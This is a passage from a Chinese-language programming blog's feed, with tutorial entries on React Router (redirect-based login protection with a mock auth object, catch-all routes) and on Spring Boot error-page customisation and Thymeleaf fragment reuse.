class="line">  <span class="built_in">console</span>.log(match)</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>User name: &#123;userId&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/(2020-06-26)React-Router-%E5%AD%A6%E4%B9%A0.md/2020-06-26-17-43-47.png" alt="" /></p><p>可以看到 <code>url</code> 的值是具体的 <code>&quot;/Users/Alice&quot;</code>，而 <code>path</code> 的值则是 <code>&quot;/Users/:userId&quot;</code>。</p><h2 id="重定向"><a class="markdownIt-Anchor" href="#重定向"></a> 重定向</h2><p>Web应用中重定向是一个很常见的操作，例如登录完成后跳转到首页，又或是未登录时自动跳转到登录页。在 react router 中有多种方式可以实现重定向。</p><ol><li>通过渲染 <code>redirect</code> 组件</li><li>通过 <code>history</code></li></ol><p>我们通过例子来学习这两种方法，我们模拟一下登录认证的过程。在 component 下创建一个新的 AuthExample.js。首先我们引入需要的包：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">  Switch,</span><br><span class="line">  Route,</span><br><span class="line">  Link,</span><br><span class="line">  Redirect,</span><br><span class="line">  useHistory,</span><br><span class="line">  useLocation</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br></pre></td></tr></table></figure><p>我们模拟的情况是一个网站中存在公共页面，也就是无需登录就可以访问的页面，同时还有私有页面，也就是必须登录才能访问的页面。如果在未登录的情况下访问私有页面，则会自动跳转到登录页。首先我们先编写一个模拟的认证功能：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fakeAuth = &#123;</span><br><span class="line">  <span class="attr">isAuthenticated</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="comment">// cb 为认证完成后的回调函数</span></span><br><span class="line">  <span class="function"><span class="title">authenticate</span>(<span class="params">cb</span>)</span> &#123;</span><br><span class="line">    fakeAuth.isAuthenticated = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(cb, <span class="number">100</span>); <span class="comment">// fake async</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="title">signout</span>(<span class="params">cb</span>)</span> &#123;</span><br><span class="line">    fakeAuth.isAuthenticated = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(cb, <span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着我们编写页面的大概结构：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> AuthExample = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">Router</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/public&quot;</span>&gt;</span>Public Page<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/protected&quot;</span>&gt;</span>Protected Page<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">Switch</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/public&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">PublicPage</span> /&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/login&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">LoginPage</span> /&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="xml">          &#123;/*一个对<span class="tag">&lt;<span class="name">Route</span>&gt;</span>组件的包装，见后文*/&#125;</span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">PrivateRoute</span> <span class="attr">path</span>=<span class="string">&quot;/protected&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">ProtectedPage</span> /&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">PrivateRoute</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">Switch</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">Router</span>&gt;</span></span></span><br><span class="line"><span class="xml">  );</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure><p>你可能发现了 <code>PrivateRoute</code> 这个组件，他是我们对于普通 <code>Route</code> 组件的封装，其中包含了判断是否登录的逻辑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PrivateRoute = <span class="function">(<span class="params">&#123; children, ...rest &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Route 的 render 属性需要传入一个函数返回需要render的内容</span></span><br><span class="line">  <span class="comment">// 会自动传入 location 变量，即用户现在所在的路径</span></span><br><span class="line">  <span class="keyword">const</span> handleRender = <span class="function">(<span class="params">&#123;location&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(fakeAuth.isAuthenticated)&#123;</span><br><span class="line">      <span class="comment">// 如果登录了就渲染 childre</span></span><br><span class="line">      <span class="keyword">return</span> children</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// 第一种方式：如果未登录就渲染 &lt;Redirect&gt; 进行重定向</span></span><br><span class="line">      <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">Redirect</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">        <span class="attr">to</span>=<span class="string">&#123;&#123;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">          // 把现在的位置放到 /<span class="attr">login</span> 的<span class="attr">state</span>中，方便登陆完成后跳转回来</span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">pathname:</span> &quot;/<span class="attr">login</span>&quot;,</span></span></span><br><span class="line"><span class="tag"><span class="xml">          <span class="attr">state:</span> &#123; <span class="attr">from:</span> <span class="attr">location</span> &#125;</span></span></span><br><span class="line"><span class="tag"><span class="xml">        &#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="xml">      /&gt;</span></span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">Route</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">      &#123;<span class="attr">...rest</span>&#125;</span></span></span><br><span class="line"><span class="tag"><span class="xml">      <span class="attr">render</span>=<span class="string">&#123;handleRender&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="xml">    /&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来则是我们的公共页，私有页和登录页：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PublicPage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Public<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ProtectedPage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Protected<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LoginPage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> history = useHistory();</span><br><span class="line">  <span class="keyword">let</span> location = useLocation();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断当前 /login 的 state 中是否有 from，如果没有就设置为 &quot;/&quot;</span></span><br><span class="line">  <span class="keyword">let</span> &#123; <span class="keyword">from</span> &#125; = location.state || &#123; <span class="attr">from</span>: &#123; <span class="attr">pathname</span>: <span class="string">&quot;/&quot;</span> &#125; &#125;;</span><br><span class="line">  <span class="keyword">let</span> login = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    fakeAuth.authenticate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 通过History进行跳转到from的页面</span></span><br><span class="line">      history.replace(<span class="keyword">from</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>You must log in to view the page at &#123;from.pathname&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;login&#125;</span>&gt;</span>Log in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行项目，你会发现点击 Protected Page 会自动跳转到登录页面，点击登录按钮后，又会自动跳转回 Protected Page.</p><h2 id="页面不存在"><a class="markdownIt-Anchor" href="#页面不存在"></a> 页面不存在</h2><p>如果用户访问不存在的路径，我们可以通过 Route 的匹配规则来捕捉所有不存在的路径：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Route path=<span class="string">&quot;*&quot;</span>&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">NoMatch</span> /&gt;</span></span></span><br><span class="line">&lt;/Route&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;引用中文文档中的介绍：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;React Router 是一个基于React 之上的强大路由库，它可以让你向应用中快速地添加视图和数据流，同时保持页面与URL 间的同步。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说使用了 React router，我们就可以通过URL来实现组件的展示与跳转。安装 React router 很简单，只需要：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install react-router-dom --save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="找工作" scheme="https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
    
    
    <category term="React" scheme="https://virgilchen97.github.io/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot-Web开发（三）</title>
    <link href="https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-06-22T15:32:09.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<p>第三部分我们学习Spring Boot的错误处理机制，以及我们如何自定义错误数据</p><h1 id="错误处理"><a class="markdownIt-Anchor" href="#错误处理"></a> 错误处理</h1><p>为了方便测试，我们先关闭拦截器，注释掉相应代码。如果此时访问一个项目中不存在的地址，我们会得到一个默认的错误页面：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-19-19-44-54.png" alt="" /></p><span id="more"></span><p>如果此时我们使用Postman向服务器像一个不存在的地址发送请求，我们会得到一个json数据：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-19-19-47-18.png" alt="" /></p><p>SpringBoot 会根据请求头中的 <code>Accept:</code> 属性来决定做出哪种请求相应。SpringBoot是如何实现的呢？我们查看 <code>ErrorMvcAutoConfiguration</code> 自动配置类发现，SpringBoot自动为我们配置了以下几个组件：</p><ul><li><code>ErrorPageCustomizer</code>：当服务器发生错误时，重定向到错误请求 (<code>/error</code>)</li><li><code>BasicErrorController</code>：处理错误请求的Controller，读取请求头的 <code>Accept:</code> 决定调用的方法类型</li><li><code>DefaultErrorViewResolver</code>： <code>BasicErrorController</code> 会通过 ErrorViewResolver接口来找到需要返回的视图，<code>DefaultErrorViewResolver</code> 就是Spring默认的实现。该实现会首先尝试模板引擎是否有适用于错误的 View，如果没有则会去静态资源目录找静态资源，如果都没有则返回null</li><li><code>DefaultErrorAttributes</code>：当使用模板引擎的时候，我们可以获取错误相关的参数，而 <code>ErrorAttributes</code> 接口则定义了获取错误参数的行为，<code>DefaultErrorAttributes</code> 就是SpringBoot的默认是实现，其中我们可以获取到的参数有：<ul><li><code>timestamp</code>：时间戳</li><li><code>status</code>：状态码</li><li><code>error</code>：错误提示</li><li><code>exception</code>：异常对象</li><li><code>message</code>：异常消息</li><li><code>errors</code>：JSR303数据校验错误</li></ul></li></ul><p>对原理有了一定了解后，我们就知道如何定制我们的错误页面了。对于定制 HTML 错误页面，我们只需要讲错误页面的模板放在模板文件的 <code>error/</code> 目录下，就会自动调用。例如如果发生了404错误，那么Spring就会去找 <code>error/404.html</code> 这个模板，对于其他错误，Spring都会寻找 <code>error/&#123;错误状态码&#125;.html</code>。你也可以通过 <code>4xx.html</code> 来响应所有的 4xx 错误。现在尝试在 <code>templates</code> 文件夹中创建 <code>error</code> 文件夹，把 404.html 移动到 <code>error</code>，修改404.html，尝试取出错误参数：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">main</span> <span class="attr">role</span>=<span class="string">&quot;main&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col-md-9 ml-sm-auto col-lg-10 pt-3 px-4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>status: [[$&#123;status&#125;]]<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Timestamp: [[$&#123;timestamp&#125;]]<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Error: [[$&#123;error&#125;]]<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时再次访问不存在的地址：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-19-20-26-13.png" alt="" /></p><p>已经变成了我们定制的错误页面。现在我们完成了错误页面的定制，那么我们如何实现错误数据的定制呢？首先我们需要为指定的错误创建对应的Exception。假设我们现在有一个请求是查找员工，地址是 <code>/employee/&#123;id&#125;</code>，当查询一个不存在的员工时，我们希望返回 404 错误，并且提示 “用户未找到”。那么首先我们创建一个Exception包，在里面创建 <code>EmployeeNotFoundException</code> 类：</p><p>我们之前提到的组件 <code>DefaultErrorAttributes</code> 包含了错误数据的格式，那么我们自己也可以实现一个 <code>ErrorAttributes</code> 并加入容器来实现错误数据的定制。在 <code>component</code> 包下创建</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第三部分我们学习Spring Boot的错误处理机制，以及我们如何自定义错误数据&lt;/p&gt;
&lt;h1 id=&quot;错误处理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#错误处理&quot;&gt;&lt;/a&gt; 错误处理&lt;/h1&gt;
&lt;p&gt;为了方便测试，我们先关闭拦截器，注释掉相应代码。如果此时访问一个项目中不存在的地址，我们会得到一个默认的错误页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-19-19-44-54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="找工作" scheme="https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
    
    
    <category term="Spring" scheme="https://virgilchen97.github.io/tags/Spring/"/>
    
    <category term="SpringBoot" scheme="https://virgilchen97.github.io/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot-Web开发（二）</title>
    <link href="https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-06-18T15:31:51.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<p>第二部分我们来实现员工的CRUD：</p><h1 id="rest-api"><a class="markdownIt-Anchor" href="#rest-api"></a> REST API</h1><p>为系统设计一下 RESTful API：</p><table><thead><tr><th>功能</th><th>URI</th><th>请求方式</th></tr></thead><tbody><tr><td>查询所有员工</td><td>/employees</td><td>GET</td></tr><tr><td>查询一个员工</td><td>/empoyee/{id}</td><td>GET</td></tr><tr><td>添加员工</td><td>/employee</td><td>POST</td></tr><tr><td>修改员工</td><td>/employee</td><td>PUT</td></tr><tr><td>删除员工</td><td>/employee/{id}</td><td>DELETE</td></tr></tbody></table><span id="more"></span><p>来到 dashboard 页面，我们希望在点击 customer 这个链接时跳转到员工列表，并可以对员工进行增删查改</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-20-15-02-50.png" alt="" /></p><p>修改 dashboard.html, 修改customer按钮的链接以及文本，注意要使用模板引擎：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/employee&#125;&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    Employees</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="themyleaf-公共元素提取"><a class="markdownIt-Anchor" href="#themyleaf-公共元素提取"></a> Themyleaf 公共元素提取</h2><p>同时我们注意到员工页面和dashboard页面其实侧边栏和顶栏使用的都是相同的元素，通过观察我们发现在dashboard页面，侧边栏的所有DOM在:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;col-md-2 d-none d-md-block bg-light sidebar&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个标签下，因此我们我们可以通过thymeleaf提取这个公共组件，再插入到dashboard页面中去，这样我们就不需要在list页面把侧边栏和顶栏的html都复制一遍了，我们可以通过添加 <code>id</code> 或是通过添加 <code>th:fragment</code> 这两个属性来标注一个公共元素：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;col-md-2 d-none d-md-block bg-light sidebar&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--or--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;col-md-2 d-none d-md-block bg-light sidebar&quot;</span> <span class="attr">th:fragment</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样我们就可以去 list.html，讲list.html文件中重复的侧边栏DOM替换为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">&quot;dashboard :: #sidebar&quot;</span>&gt;</span> <span class="comment">&lt;!--使用css选择器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">&quot;dashboard :: sidebar&quot;</span>&gt;</span> <span class="comment">&lt;!--使用fragment标注--&gt;</span></span><br></pre></td></tr></table></figure><p>完成后，为了测试效果，我们编写一个简单的 <code>EmployeeController</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/employee&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">list</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-20-20-44-50.png" alt="" /></p><p>试着访问list页面，发现侧边栏依然可以正常显示。因此我们可以吧这些通用的HTML组件提取出来。在 templates 下新建 commons 文件夹，创建 bar.html，把我们之前标注的sidebar部分的HTML剪切过来。同时我们对于顶栏也可以做相同的操作：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-20-20-56-06.png" alt="" /></p><p>然后在dashboard和list页面使用 <code>th:replace</code> 来注入top bar和side bar：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">&quot;commons/bar :: sidebar&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>但是仍然有一个问题，就是即使我们现在处于Employee页面，侧边栏高亮的仍然是 Dashboard。这里我们需要用到themyleaf的参数化片段。观察高亮的按钮，我们发现其实是标签的class多了一个 <code>active</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link active&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/main&#125;&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    Dashboard </span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以在此处添加一个判断，通过判断 <code>activeUri</code> 来决定是否要在class中加入 <code>active</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link active&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">th:class</span>=<span class="string">&quot;$&#123;activeUri == &#x27;main&#x27; ? &#x27;nav-link active&#x27; : &#x27;nav-link&#x27;&#125;&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/main&#125;&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    Dashboard </span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link active&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">th:class</span>=<span class="string">&quot;$&#123;activeUri == &#x27;employee&#x27; ? &#x27;nav-link active&#x27; : &#x27;nav-link&#x27;&#125;&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/employee&#125;&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    Employee</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么这个 <code>activeUri</code> 的变量从哪里来呢？这是我们就要修改dashboard和list这两个页面中引用这段HTML的地方，传入 <code>activeUri</code>：</p><figure class="highlight html"><table><tr><td 